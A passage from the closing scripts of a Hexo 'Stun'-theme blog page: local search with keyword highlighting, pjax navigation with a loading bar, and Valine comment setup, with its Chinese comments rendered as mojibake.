              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // æ–‡ç« æ€»çš„æœç´¢æƒé‡
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„æ ‡é¢˜
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„å†…å®¹
              var postContent;
              // æ˜¾ç¤ºå†…å®¹çš„é•¿åº¦
              var SHOW_WORD_LENGTH = 200;
              // å‘½ä¸­å…³é”®è¯å‰çš„å­—ç¬¦æ˜¾ç¤ºé•¿åº¦
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // æˆªå–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå‰åå…± 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // æœªåŒ¹é…åˆ°å†…å®¹ï¼Œç›´æ¥æˆªå–å‰ 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // æŒ‰æƒé‡é€’å¢çš„é¡ºåºæ’åºï¼Œä½¿æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'è¯·è¾“å…¥å­—ç¬¦');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
  // åŠ è½½è¿›åº¦æ¡çš„è®¡æ—¶å™¨
  var loadingTimer = null;

  // é‡ç½®é¡µé¢ Y æ–¹å‘ä¸Šçš„æ»šåŠ¨åç§»é‡
  document.addEventListener('pjax:send', function () {
    $('.header-nav-menu').removeClass('show');
    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
      $('html').velocity('scroll', {
        duration: 500,
        offset: $('#header').height(),
        easing: 'easeInOutCubic'
      });
    }

    var loadingBarWidth = 20;
    var MAX_LOADING_WIDTH = 95;

    $('.loading-bar').addClass('loading');
    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    clearInterval(loadingTimer);
    loadingTimer = setInterval(function () {
      loadingBarWidth += 3;
      if (loadingBarWidth > MAX_LOADING_WIDTH) {
        loadingBarWidth = MAX_LOADING_WIDTH;
      }
      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    }, 500);
  }, false);

  window.addEventListener('pjax:complete', function () {
    clearInterval(loadingTimer);
    $('.loading-bar__progress').css('width', '100%');
    $('.loading-bar').removeClass('loading');
    setTimeout(function () {
      $('.loading-bar__progress').css('width', '0');
    }, 400);
    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
      $(this).remove();
    });
    $('script[data-pjax], #pjax-reload script').each(function () {
      $(this).parent().append($(this).remove());
    });

    if (Stun.utils.pjaxReloadBoot) {
      Stun.utils.pjaxReloadBoot();
    }
    if (Stun.utils.pjaxReloadScroll) {
      Stun.utils.pjaxReloadScroll();
    }
    if (Stun.utils.pjaxReloadSidebar) {
      Stun.utils.pjaxReloadSidebar();
    }
    if (false) {
      if (Stun.utils.pjaxReloadHeader) {
        Stun.utils.pjaxReloadHeader();
      }
      if (Stun.utils.pjaxReloadScrollIcon) {
        Stun.utils.pjaxReloadScrollIcon();
      }
      if (Stun.utils.pjaxReloadLocalSearch) {
        Stun.utils.pjaxReloadLocalSearch();
      }
    }
  }, false);
}, false);</script><div id="pjax-reload"><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script></div><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script data-pjax="">function loadValine () {
  var GUEST_INFO = ['nick', 'mail', 'link'];
  var guest_info = 'nick,mail,link';

  guest_info = guest_info.split(',').filter(function(item) {
    return GUEST_INFO.indexOf(item) > -1;
  });
  new Valine({
    el: '#valine-container',
    appId: 'PRycUaQbxE5mebmnKTjtaRJg-gzGzoHsz',
    appKey: 'jGyP9zr05MTuqHpWaIkgYW4h',
    notify: true,
    verify: true,
    placeholder: 'å†™ç‚¹ä»€ä¹ˆå§',
    avatar: 'mp',
    meta: guest_info,
    pageSize: '10' || 10,
    visitor: true,
    recordIP: true,
    lang: 'zh-cn,en' || 'zh-cn',
    path: window.location.pathname
  });
}

if (true) {
  loadValine();
} else {
  window.addEventListener('DOMContentLoaded', loadValine, false);
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.xml"></script></body></html>